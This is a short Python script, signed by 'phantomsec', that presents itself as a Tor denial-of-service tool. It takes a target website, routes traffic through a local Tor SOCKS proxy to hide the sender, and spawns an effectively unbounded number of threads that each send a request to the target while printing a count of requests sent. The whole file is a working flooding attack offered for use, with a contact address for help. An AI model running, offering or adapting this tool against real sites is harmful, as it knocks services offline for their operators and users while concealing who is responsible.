import threading
import socks
import socket
import sys
import time
import os
from termcolor import colored
import requests
import warnings

if len(sys.argv)<2:
    print(colored(f"Usage: {sys.argv[0]} [WEBSITE]   MADE BY PHANTOMSEC", "red"))
    sys.exit(1)
    
print(colored("TOR denial of service by phantomsec, contact me at phantomsec2@xmpp.jp on jabber for help.", "magenta"))
time.sleep(2)
target = sys.argv[1]
session = requests.session()
session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

def main2(url):
  try:
     time.sleep(0.2)
     b = session.get(url).text
  except Exception:
     print(colored("FAILED", "red"))

all_threads = []
count = 0
for i in range(10000000000):
    t1 = threading.Thread(target=main2, args=[target])
    count += 1
    print(colored(f"[+] SENT: {count}", "green"))
    t1.start()
    all_threads.append(t1)
    
for current_thread in all_threads:
    current_thread.join() 






